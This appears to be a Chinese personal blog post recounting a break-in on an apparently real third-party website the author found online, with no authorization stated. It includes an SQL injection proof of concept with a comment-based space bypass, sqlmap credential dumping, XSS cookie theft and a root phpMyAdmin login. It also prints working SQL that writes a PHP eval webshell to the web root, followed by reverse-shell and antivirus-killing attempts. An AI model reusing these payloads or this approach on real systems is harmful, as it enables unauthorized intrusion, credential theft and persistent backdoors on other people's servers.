---
layout: post
title: "[实战]从SQL注入到webshell"
date: 2018-03-23 22：00
categories: jekyll update
---

# 前言
&emsp;&emsp;由于上篇实在是水了，，，所以就网上搜集了一番，然后就找到了一个。。。

&emsp;&emsp;首先检查一下sql注入，然后在`下载文件`的地方发现了一处，而且还把网站的`物理路径`暴露出来了。
<div align="center">
    <img src="/images/posts/shentou/9.png" >  
</div>
&emsp;&emsp;接着就找了下验证的POC，发现它过滤了`空格`，因为当`and 1=2`的时候也返回了真。
<div align="center">
    <img src="/images/posts/shentou/10.png" >  
</div>
&emsp;&emsp;所以考虑使用`/**/`太代替空格，发现确实可行。
```
poc: 
?sid=1300/**/and/**/1=2
?sid=1300/**/and/**/1=1
```
&emsp;&emsp;如图：
<div align="center">
    <img src="/images/posts/shentou/12.png" >  
</div>
<div align="center">
    <img src="/images/posts/shentou/13.png" >  
</div>
&emsp;&emsp;所以接下来我就是用了`sqlmap`进行注入，只需要加上`--tamper space2comment`。经过好一番的查找，才拿到了数据库中的账号和密码。
<div align="center">
    <img src="/images/posts/shentou/11.png" >  
</div>
&emsp;&emsp;按照套路，我们就要找后台了。但这里并没有那么愉快，扫描了一下网站目录，却没有找到有价值的线索。只是暴露了几个`目录遍历`漏洞。
<div align="center">
    <img src="/images/posts/shentou/14.png" >  
</div>
<div align="center">
    <img src="/images/posts/shentou/15.png" height="70%" />  
</div>
&emsp;&emsp;而且从账号上暴露的`phpmyadmin`用户猜想到有`phpmyadmin`目录，但是也没有找到。
<div align="center">
    <img src="/images/posts/shentou/17.png" >  
</div>
&emsp;&emsp;然后就想使用`XSS`看看能不能找到管理员的后台地址，但结果是留言板确实是存在`xss`但却没有找到管理员的地址。
<div align="center">
    <img src="/images/posts/shentou/16.png" >  
</div>
&emsp;&emsp;带着`cookie`访问`XSS`打到的网址是报了个验证码错误，所以这条线也走不了了。

&emsp;&emsp;后来经前辈提醒，可以直接使用`http://ip/phpmyadmin`的访问方式试试，那么首先检测一下有没有`CDN`。用`多地ping`检测了一下，发现应该是没有`CDN`，然后直接访问看看。
<div align="center">
    <img src="/images/posts/shentou/18.png" >  
</div>
&emsp;&emsp;最后使用`root`账号密码登陆进去了。由于`物理路径`已经知道了，那么后面的操作就简单了，直接使用`mysql`写一句话后门。
```sql
Create TABLE a (cmd text NOT NULL);
Insert INTO a (cmd) VALUES('<?php @eval($_POST[cmd])?>');
select cmd from a into outfile 'C:/暴露出来的根路径/out.php';
Drop TABLE IF EXISTS a;
```

&emsp;&emsp;随便找个表执行下上面的`sql`语句即可。
<div align="center">
    <img src="/images/posts/shentou/19.png" height="60%" />  
</div>
<div align="center">
    <img src="/images/posts/shentou/20.png" height="60%" />  
</div>
&emsp;&emsp;然后访问根目录下的`out.php`。
<div align="center">
    <img src="/images/posts/shentou/21.png" />  
</div>
<div align="center">
    <img src="/images/posts/shentou/22.png" height="70%" />  
</div>
&emsp;&emsp;但是使用菜刀连接时却发现连接不上，估计是有`WAF`。而从`phpinfo`暴露出来的环境可以知道是内网，并且权限很高，所以心就更痒痒了。
<div align="center">
    <img src="/images/posts/shentou/23.png" />  
</div>
<div align="center">
    <img src="/images/posts/shentou/24.png" />  
</div>
&emsp;&emsp;所以我们要采用迂回战术，，，我们看看能不能`反弹shell`。但是发现反弹回来立马被干掉了。。。
<div align="center">
    <img src="/images/posts/shentou/25.png" />  
</div>
&emsp;&emsp;看看目标的进程，发现是`趋势杀软`。
<div align="center">
    <img src="/images/posts/shentou/26.png" />  
</div>
<div align="center">
    <img src="/images/posts/shentou/27.png" />  
</div>
&emsp;&emsp;这里尝试将它的进程结束掉，但却没有用。由于明天`强网杯`，而且杀软也还`没`想到法绕过，所以暂且放下，两天后再战。。。
&emsp;&emsp;
&emsp;&emsp;
&emsp;&emsp;
&emsp;&emsp;
&emsp;&emsp;
&emsp;&emsp;
&emsp;&emsp;
&emsp;&emsp;
&emsp;&emsp;
&emsp;&emsp;
&emsp;&emsp;
&emsp;&emsp;
&emsp;&emsp;
&emsp;&emsp;
&emsp;&emsp;
&emsp;&emsp;
&emsp;&emsp;
&emsp;&emsp;
&emsp;&emsp;